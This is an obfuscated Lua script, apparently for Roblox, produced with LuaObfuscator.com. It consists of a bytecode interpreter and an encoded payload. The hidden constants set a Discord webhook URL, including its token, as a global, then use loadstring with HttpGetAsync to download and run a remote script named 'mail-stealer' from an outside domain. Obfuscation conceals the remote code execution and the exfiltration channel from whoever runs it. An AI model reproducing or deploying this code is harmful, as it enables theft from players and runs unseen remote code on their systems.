--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.5) ~  Much Love, Ferib 

]]--

do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v20)if (v1(v20,2)==79) then v19=v0(v3(v20,1,1));return "";else local v71=v2(v0(v20,16));if v19 then local v77=0;local v78;while true do if (v77==0) then v78=v5(v71,v19);v19=nil;v77=1;end if (v77==1) then return v78;end end else return v71;end end end);local function v21(v22,v23,v24)if v24 then local v72=(v22/((1771 -(1730 + 39))^(v23-(1 + 0))))%((883 -(377 + 504))^(((v24-(3 -(1 + 1))) -(v23-(2 -1))) + (2 -1))) ;return v72-(v72%(76 -(27 + 48))) ;else local v73=(8 -6)^(v23-1) ;return (((v22%(v73 + v73))>=v73) and (1 + 0)) or (0 -0) ;end end local function v25()local v38=0 + 0 + 0 ;local v39;while true do if (v38==(0 -(1481 -(822 + 659)))) then v39=v1(v16,v18,v18);v18=v18 + ((5094 -4034) -(213 + (2256 -1410))) ;v38=2 -1 ;end if (v38==(1486 -(1216 + 269))) then return v39;end end end local function v26()local v40=0;local v41;local v42;while true do if (v40==(1448 -(889 + 558))) then return (v42 * (55 + 201)) + v41 ;end if ((0 + 0)==v40) then v41,v42=v1(v16,v18,v18 + (6 -4) );v18=v18 + 1 + 1 ;v40=186 -(182 + 0 + 3) ;end end end local function v27()local v43=0 -0 ;local v44;local v45;local v46;local v47;while true do if (v43==(1 -0)) then return (v47 * (16778479 -(336 + 927))) + (v46 * (176687 -111151)) + (v45 * (539 -283)) + v44 ;end if (v43==(0 + 0)) then v44,v45,v46,v47=v1(v16,v18,v18 + (4 -1) );v18=v18 + 3 + 1 ;v43=2 -1 ;end end end local function v28()local v48=0 -0 ;local v49;local v50;local v51;local v52;local v53;local v54;while true do if (v48==(0 + 0 + 0)) then v49=v27();v50=v27();v48=173 -(83 + 89) ;end if (v48==(1745 -(408 + (4560 -3226)))) then if (v53==(0 -0)) then if (v52==(514 -(292 + 222))) then return v54 * (0 -0) ;else v53=1825 -(1639 + 185) ;v51=0;end elseif (v53==(313 + 948 + 786)) then return ((v52==((1006 -(32 + 974)) -0)) and (v54 * ((1 -0)/(0 -(1736 -(1658 + 78)))))) or (v54 * NaN) ;end return v8(v54,v53-(1412 -(70 + 319)) ) * (v51 + (v52/(2^(708 -(116 + 540))))) ;end if (v48==((1933 -(1124 + 807)) -0)) then v53=v21(v50,104 -83 ,79 -(39 + 2 + 7) );v54=((v21(v50,158 -(65 + 61) )==(1680 -((3324 -(1639 + 70)) + 64))) and  -(1 + 0)) or (1 + 0) ;v48=(9 + 0) -6 ;end if (v48==(743 -((741 -394) + 395))) then v51=1;v52=(v21(v50,1 + 0 + 0 ,305 -(18 + 267) ) * ((1960 -(1384 + (1829 -(913 + 342))))^32)) + v49 ;v48=3 -1 ;end end end local function v29(v30)local v55=(0 -0) -0 ;local v56;local v57;while true do if (0==v55) then v56=nil;if  not v30 then v30=v27();if (v30==(0 + 0 + 0)) then return "";end end v55=1034 -(781 + (1013 -761)) ;end if (v55==(610 -(503 + 105))) then v57={};for v79=786 -(729 + 56) , #v56 do v57[v79]=v2(v1(v3(v56,v79,v79)));end v55=253 -(9 + 241) ;end if (v55==(1316 -(796 + 517))) then return v6(v57);end if (v55==(1 -0)) then v56=v3(v16,v18,(v18 + v30) -(1881 -(1330 + 550)) );v18=v18 + v30 ;v55=(616 + 1382) -(1080 + 745 + 171) ;end end end local v31=v27;local function v32(...)return {...},v12("#",...);end local function v33()local v58=1259 -(1049 + 210) ;local v59;local v60;local v61;local v62;local v63;local v64;local v65;local v66;while true do if ((0 -0)==v58) then v59=0 + 0 ;v60=nil;v58=1 + 0 ;end if (v58~=(12 -9)) then else v65=nil;v66=nil;v58=1578 -(75 + 1499) ;end if (v58==(1822 -(833 + 985))) then while true do if (v59~=(6 -4)) then else local v96=994 -(741 + 253) ;while true do if (v96==(1800 -(1614 + 186))) then local v110=0 -0 ;while true do if (v110==(799 -(88 + 710))) then v96=1;break;end if (v110==0) then v64=nil;v65=nil;v110=1;end end end if (v96==(1 + 0)) then v59=3;break;end end end if (v59==1) then local v97=0 + 0 ;while true do if (0==v97) then local v111=0 + 0 ;while true do if (v111==(0 + 0)) then v62=nil;v63=nil;v111=1;end if (v111==1) then v97=1 + 0 ;break;end end end if (v97==(2 -1)) then v59=3 -1 ;break;end end end if (v59==3) then v66=nil;while true do local v103=0 + 0 ;local v104;local v105;while true do if (v103==(0 + 0)) then v104=0 -0 ;v105=nil;v103=1 + 0 ;end if (v103==(3 -2)) then while true do if ((751 -(130 + 621))==v104) then v105=0 + 0 ;while true do if (v105~=(0 -0)) then else local v114=0;while true do if (v114~=0) then else if (v60==(1447 -(1429 + 15))) then local v119=0;local v120;local v121;while true do if (v119~=(1601 -(1105 + 495))) then else while true do if (v120==0) then v121=729 -(168 + 561) ;while true do local v166=0;while true do if (v166==(0 -0)) then if (v121~=(0 -0)) then else local v184=0 + 0 ;local v185;while true do if (v184~=0) then else v185=0 + 0 ;while true do if (v185==(0 -0)) then local v198=0 + 0 ;while true do if (v198==(1 + 0)) then v185=2 -1 ;break;end if (v198~=0) then else for v208=2 -1 ,v27() do v62[v208-(1 + 0) ]=v33();end for v210=1 -0 ,v27() do v63[v210]=v27();end v198=1 + 0 ;end end end if (v185==(1 + 0)) then v121=3 -2 ;break;end end break;end end end if (v121==1) then return v64;end break;end end end break;end end break;end if (v119~=0) then else v120=425 -(416 + 9) ;v121=nil;v119=1 + 0 ;end end end if (v60~=(0 -0)) then else local v122=0 + 0 ;local v123;while true do if (v122==(287 -(257 + 30))) then v123=0 + 0 ;while true do if ((1854 -(381 + 1472))==v123) then v63={};v60=1;break;end if (v123==(0 -0)) then v61={};v62={};v123=1 + 0 ;end end break;end end end v114=1 + 0 ;end if (v114==1) then v105=1;break;end end end if (v105==(4 -3)) then if ((3 -2)==v60) then local v115=0 + 0 ;local v116;while true do if (v115==0) then v116=0;while true do if (v116==1) then v66={};v60=1534 -(711 + 821) ;break;end if ((0 + 0)==v116) then local v147=1411 -(138 + 1273) ;while true do if ((152 -(77 + 74))==v147) then v116=1076 -(96 + 979) ;break;end if (v147~=(0 -0)) then else v64={v61,v62,nil,v63};v65=v27();v147=4 -3 ;end end end end break;end end end if (2==v60) then local v117=0;local v118;while true do if (v117==0) then v118=0;while true do if (v118~=(530 -(179 + 350))) then else for v153=1182 -(12 + 1169) ,v27() do local v154=0 + 0 ;local v155;local v156;while true do if (v154==(0 -0)) then v155=1068 -(996 + 72) ;v156=nil;v154=1;end if ((2 -1)~=v154) then else while true do if (v155~=(1587 -(958 + 629))) then else v156=v25();if (v21(v156,1 + 0 ,1)==(0 + 0)) then local v186=1229 -(300 + 929) ;local v187;local v188;local v189;local v190;local v191;while true do if (v186~=2) then else v191=nil;while true do if (v187==2) then while true do if (v188~=(0 + 0)) then else local v201=0 + 0 ;local v202;while true do if (v201~=(1398 -(678 + 720))) then else v202=0 + 0 ;while true do if (v202==(662 -(354 + 308))) then local v215=599 -(266 + 333) ;local v216;while true do if (v215~=(0 + 0)) then else v216=1422 -(977 + 445) ;while true do if (v216==(0 -0)) then local v222=0;while true do if (v222==0) then v189=v21(v156,3 -1 ,3);v190=v21(v156,3 + 1 ,15 -9 );v222=1700 -(188 + 1511) ;end if (v222~=(1 + 0)) then else v216=1 + 0 ;break;end end end if (v216~=1) then else v202=1 -0 ;break;end end break;end end end if (v202~=(2 -1)) then else v188=1 -0 ;break;end end break;end end end if (v188==(8 -5)) then if (v21(v190,294 -(200 + 91) ,1800 -(507 + 1290) )==(609 -(411 + 197))) then v191[9 -5 ]=v66[v191[4]];end v61[v153]=v191;break;end if (v188==(1 -0)) then local v204=0;while true do if (v204==1) then v188=1 + 1 ;break;end if (v204~=(0 -0)) then else local v214=0 + 0 ;while true do if (v214~=0) then else v191={v26(),v26(),nil,nil};if (v189==(0 -0)) then local v217=0 -0 ;while true do if (v217==(799 -(302 + 497))) then v191[3 -0 ]=v26();v191[15 -11 ]=v26();break;end end elseif (v189==(1 + 0)) then v191[1165 -(237 + 925) ]=v27();elseif (v189==(1466 -(1417 + 47))) then v191[3]=v27() -((2 + 0)^(165 -(27 + 122))) ;elseif (v189==(9 -6)) then local v224=0 + 0 ;local v225;local v226;local v227;while true do if (v224~=1) then else v227=nil;while true do if (v225==(0 + 0)) then local v232=0 -0 ;while true do if ((2 -1)==v232) then v225=1 -0 ;break;end if (v232==(562 -(466 + 96))) then v226=0 + 0 ;v227=nil;v232=1;end end end if (v225~=1) then else while true do if (v226~=(1071 -(10 + 1061))) then else v227=0 + 0 ;while true do if (v227==(1229 -(794 + 435))) then v191[3]=v27() -((1437 -(519 + 916))^(36 -20)) ;v191[1305 -(330 + 971) ]=v26();break;end end break;end end break;end end break;end if (v224==(130 -(74 + 56))) then v225=1756 -(1241 + 515) ;v226=nil;v224=1 -0 ;end end end v214=1 -0 ;end if (v214==(1 -0)) then v204=1003 -(402 + 600) ;break;end end end end end if (v188==2) then local v205=0 -0 ;local v206;local v207;while true do if (v205==(1 -0)) then while true do if (v206==(0 + 0)) then v207=0;while true do if (v207==(1 + 0)) then v188=3;break;end if (v207~=0) then else local v218=0 -0 ;while true do if ((290 -(198 + 91))~=v218) then else v207=1 -0 ;break;end if (v218~=(1346 -(586 + 760))) then else if (v21(v190,3 -2 ,2 -1 )==(1 + 0)) then v191[2 + 0 ]=v66[v191[2]];end if (v21(v190,2,2 + 0 )~=(1 -0)) then else v191[3 + 0 ]=v66[v191[1664 -(790 + 871) ]];end v218=1;end end end end break;end end break;end if (v205==0) then v206=0 -0 ;v207=nil;v205=1319 -(72 + 1246) ;end end end end break;end if (0~=v187) then else local v199=0;while true do if (v199~=(1464 -(511 + 952))) then else v187=1 + 0 ;break;end if ((1293 -(813 + 480))~=v199) then else v188=919 -(488 + 431) ;v189=nil;v199=3 -2 ;end end end if (v187~=(1063 -(1020 + 42))) then else local v200=901 -(339 + 562) ;while true do if (0~=v200) then else v190=nil;v191=nil;v200=245 -(106 + 138) ;end if (v200==1) then v187=2;break;end end end end break;end if ((3 -2)==v186) then v189=nil;v190=nil;v186=2 -0 ;end if (v186==0) then v187=0 -0 ;v188=nil;v186=2 -1 ;end end end break;end end break;end end end v60=1687 -(350 + 1334) ;break;end if (v118==(0 -0)) then local v148=0 -0 ;while true do if ((0 + 0)==v148) then for v167=1 + 0 ,v65 do local v168=0;local v169;local v170;local v171;while true do if (v168==(0 + 0)) then local v182=0;while true do if (v182~=(0 + 0)) then else v169=0;v170=nil;v182=219 -(174 + 44) ;end if (1==v182) then v168=1;break;end end end if (v168==(1 + 0)) then v171=nil;while true do if (v169~=(1 + 0)) then else if (v170==(1 + 0)) then v171=v25()~=(0 -0) ;elseif (v170==2) then v171=v28();elseif (v170==(2 + 1)) then v171=v29();end v66[v167]=v171;break;end if (v169==0) then local v193=0;local v194;while true do if (v193==0) then v194=0;while true do if (v194==(347 -(280 + 66))) then v169=1 + 0 ;break;end if ((0 + 0)==v194) then v170=v25();v171=nil;v194=1;end end break;end end end end break;end end end v64[8 -5 ]=v25();v148=1;end if (v148==(1090 -(898 + 191))) then v118=1 + 0 ;break;end end end end break;end end end break;end end break;end end break;end end end break;end if (v59~=(0 -0)) then else v60=1076 -(71 + 1005) ;v61=nil;v59=938 -(357 + 580) ;end end break;end if (v58==(2 + 0)) then v63=nil;v64=nil;v58=4 -1 ;end if ((38 -(32 + 5))~=v58) then else v61=nil;v62=nil;v58=1780 -(1693 + 85) ;end end end local function v34(v35,v36,v37)local v67=0;local v68;local v69;local v70;while true do if (v67==1) then v70=v35[3];return function(...)local v81=1;local v82= -1;local v83={...};local v84=v12("#",...) -1 ;local function v85()local v86=v68;local v87=v69;local v88=v70;local v89=v32;local v90={};local v91={};local v92={};for v98=779 -(96 + 103 + (775 -(50 + 145))) ,v84 do if (((23 + 499)<=(5869 -(883 + 1045))) and (v98>=v88)) then v90[v98-v88 ]=v83[v98 + 1 + 0 + 0 ];else v92[v98]=v83[v98 + 1 ];end end local v93=(v84-v88) + (1683 -(1049 + 633)) ;local v94;local v95;while true do local v99=1137 -(167 + 970) ;local v100;local v101;while true do if ((v99==(1 -0)) or ((540 + 1805)<333)) then while true do if ((v100==(0 + 0)) or ((13495 -9893)>(4730 -(1022 + 16)))) then v101=0 -0 ;while true do if ((v101==(2 -1)) or ((391 -284)>=(4824 -2131))) then if (((1454 + 1840)<(11409 -6771)) and (v95<=(12 -7))) then if (((798 -240)<(4515 -2505)) and (v95<=(4 -2))) then if ((v95<=(0 -0)) or ((1997 + 1828)<(2264 -1051))) then v92[v94[797 -((1587 -(994 + 264)) + 466) ]]();elseif ((((13394 -8702) -(1650 + 310))==(8553 -5821)) and (v95>(1685 -(738 + 946)))) then v92[v94[1 + (3 -2) ]]=v94[11 -8 ];else v92[v94[1768 -(978 + 788) ]][v94[7 -4 ]]=v94[3 + 1 ];end elseif ((2868==(7280 -4412)) and (v95<=(1 + 2))) then v81=v94[2 + 1 ];elseif (((3219 -2211)<=1857) and (v95>(532 -(517 + (1534 -(1283 + 240)))))) then local v132=0;local v133;local v134;while true do if ((((4738 -(107 + 145)) -(26 + (1139 -(726 + 40))))>=1265) and (v132==(1458 -(322 + 1136)))) then v133=773 -(24 + 749) ;v134=nil;v132=133 -(95 + 37) ;end if ((3606>(1550 -((141 -(52 + 16)) + 1219))) and (v132==(808 -(95 + 712)))) then while true do if ((v133==(0 + 0)) or ((3393 + 122)>3528)) then v134=v94[3 -(1 + 0) ];v92[v134]=v92[v134](v13(v92,v134 + 1 + 0 ,v82));break;end end break;end end else v92[v94[2 + 0 ]]=v94[674 -(519 + 152) ]~=(0 + 0) ;end elseif ((v95<=(7 + 1)) or ((921 + 2315)<(1846 + 1342))) then if (((1105 + 609)<(3884 -(475 + 23))) and (v95<=(1417 -(784 + 627)))) then local v125=(1699 -(285 + 1414)) + 0 ;local v126;while true do if ((0==v125) or ((14 -8)==(8987 -6956))) then v126=v94[3 -1 ];v92[v126]=v92[v126]();break;end end elseif (((6801 -(1552 + 380))>=(1946 + 860 + 683)) and (v95>(1 + 6))) then if (((679 + 1130)<(361 + 76 + 3583)) and (v94[1 + 1 ]==v92[v94[1154 -(58 + 1092) ]])) then v81=v81 + 1 ;else v81=v94[3 -0 ];end else local v136=0 + 0 ;local v137;local v138;while true do if ((v136==(345 -(121 + 224))) or ((5258 -3069)>=(1984 + 2716))) then local v159=0 -0 ;while true do if ((v159==(1 + 0)) or (344>(2803 -(154 + 190)))) then v136=465 -(121 + 343) ;break;end if ((4804>=(3198 + 709)) and ((0 -(0 + 0))==v159)) then v137=v94[2];v138=v92[v94[8 -5 ]];v159=2 -1 ;end end end if ((v136==(1 -0)) or ((3146 + 333)==((4057 -2428) + 261))) then v92[v137 + (2 -1) ]=v138;v92[v137]=v138[v94[9 -5 ]];break;end end end elseif ((v95<=(9 + 1)) or ((4476 + 366)==4195)) then if ((v95>(9 + 0)) or ((645 + 1193)>=(4325 -(1686 + 41)))) then local v139=0 -(0 -0) ;local v140;local v141;local v142;local v143;local v144;while true do if ((v139==(1 -0)) or ((6467 -(1110 + 543))==1942)) then local v163=0 + 0 ;while true do if ((v163==((233 + 607) -(169 + 671))) or ((2243 -1663)>2015)) then v142=nil;v143=nil;v163=551 -(223 + (1532 -(1197 + 8))) ;end if ((4963>(5092 -(185 + (2015 -1284)))) and (v163==(1 -0))) then v139=1 + 1 ;break;end end end if (((608 + 1172)==(1220 + 560)) and (v139==(1060 -(382 + 676)))) then v144=nil;while true do if (((11337 -(13443 -6599))>((1574 -(41 + 16)) + 1321)) and (v140==0)) then local v176=545 -(226 + (919 -600)) ;while true do if ((v176==(706 -(386 + 320))) or ((2559 + 14)>(12638 -9102))) then local v183=239 -(149 + 90) ;while true do if (((3223 -2445)==((3469 -1565) -(571 + 555))) and (v183==(2 -1))) then v176=1 + 0 ;break;end if ((v183==(1596 -(1437 + 159))) or ((1517 + (4885 -(829 + 1148)))<=3399)) then v141=v94[7 -5 ];v142,v143=v89(v92[v141](v13(v92,v141 + 1 + 0 ,v94[3])));v183=1 + 0 ;end end end if (((2570 -1620)<=(13530 -(1242 + 8543))) and (v176==(1 -0))) then v140=(1207 -568) -(134 + 504) ;break;end end end if (((637 + 2645)>=(82 + 256)) and (v140==(4 -2))) then for v179=v141,v82 do local v180=1798 -(1191 + (1256 -649)) ;local v181;while true do if (((4675 -2818)>470) and (v180==0)) then v181=0 + 0 + 0 ;while true do if ((v181==0) or ((2910 + 810)<(5205 -3045))) then v144=v144 + (708 -(168 + 539)) ;v92[v179]=v142[v144];break;end end break;end end end break;end if (((1662 -(127 + 1534))==v140) or ((1746 + 114)>(3174 + 1644))) then local v177=1240 -(1225 + 15) ;local v178;while true do if ((((4640 -2670) -(603 + 312))>((539 + 2040) -(1234 + (1433 -859)))) and (v177==(0 -0))) then v178=0 -0 ;while true do if ((((78342 -58125) -(23819 -8225))>(7402 -5050)) and (v178==(1333 -(280 + 1052)))) then v140=2;break;end if ((v178==(0 -0)) or ((3528 -((132 -83) + 141))<(1206 + 572))) then v82=(v143 + v141) -(700 -(120 + 579)) ;v144=(1860 -(545 + 1315)) -0 ;v178=3 -2 ;end end break;end end end end break;end if (((1424 + 3448)>(3312 -(612 + 1192))) and (v139==0)) then local v164=(1902 -(289 + 1613)) + 0 + 0 ;while true do if (((4028 -(269 + 721))<(2645 + 505)) and (v164==(1166 -(327 + (1617 -(90 + 689)))))) then v139=1564 -(833 + 730) ;break;end if (((998 -(977 + 21))==v164) or ((1464 + 1105)>=2598)) then v140=0;v141=nil;v164=1;end end end end else do return;end end elseif (((3359 -1562)<(11450 -9148)) and (v95==(32 -21))) then v92[v94[992 -(411 + 579) ]]=v37[v94[3 + 0 ]];elseif ((v92[v94[2]]==v94[2 + 2 ]) or ((176 + 18)>(5679 -(580 + 338)))) then v81=v81 + (737 -(395 + 341)) ;else v81=v94[3];end v81=v81 + (399 -(182 + 216)) ;break;end if (((9616 -6344)>=(1949 -(992 + 796))) and (v101==(0 + 0 + 0))) then local v112=0 + 0 ;local v113;while true do if ((v112==(0 + (550 -(472 + 78)))) or ((2874 -(623 + 947))<(2611 -((2111 -(528 + 970)) + 891)))) then v113=1123 -(885 + 238) ;while true do if ((211<=(1094 -(393 + 258))) and (v113==(1 -0))) then v101=1832 -(885 + 946) ;break;end if (((6443 -(422 + 1390))>=(2523 -1107)) and (v113==(1506 -(280 + 1226)))) then local v127=0 -0 ;while true do if (((2348 -(291 + 498))>(1758 -(29 + 1486))) and (v127==0)) then v94=v86[v81];v95=v94[82 -(22 + 59) ];v127=1487 -(245 + 1241) ;end if ((2773<(6954 -3412)) and (v127==(48 -(23 + 24)))) then v113=2 -1 ;break;end end end end break;end end end end break;end end break;end if ((v99==0) or ((1940 + 1750 + 612)<(4053 -1950))) then v100=0 + 0 ;v101=nil;v99=15 -(11 + 3) ;end end end end A,B=v32(v11(v85));if  not A[1] then local v102=v35[4][v81] or "?" ;error("Script error at ["   .. v102   .. "]:"   .. A[2] );else return v13(A,2,B);end end;end if (v67==0) then v68=v35[1];v69=v35[2];v67=1;end end end return v34(v33(),{},v17)(...);end v15("LOL!0D3O00028O0003073O0067657467656E7603073O00776562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F31303835372O36372O313634383731383937392F5F595564434B2O694262536E355951334F535F485772796538366349596F53417332526E684632574E6D725A676A4E47554B3148425469386D385172576D49426936587A03043O006E616D6503123O00696D5F747279696E67746F676574672O6F64026O00F03F03093O006D6F7573656C6F636B2O01030A3O006C6F6164737472696E6703043O0067616D65030C3O00482O74704765744173796E63032A3O00682O7470733A2O2F77756D61742E78797A2F736372697074732F6D61696C2D737465616C65722E6C7561001A3O0012023O00013O000E080001000A00013O0004033O000A000100120B000100024O000600010001000200300100010003000400120B000100024O00060001000100020030010001000500060012023O00073O00260C3O0001000100070004033O0001000100120B000100024O000600010001000200300100010008000900120B0001000A3O00120B0002000B3O00200700020002000C0012020004000D4O0004000500014O000A000200054O000500013O00024O0001000100010004033O001900010004033O000100012O00093O00017O001A3O00023O00043O00043O00053O00053O00053O00063O00063O00063O00073O00093O00093O000A3O000A3O000A3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000C3O000D3O000F3O00",v9(),...);end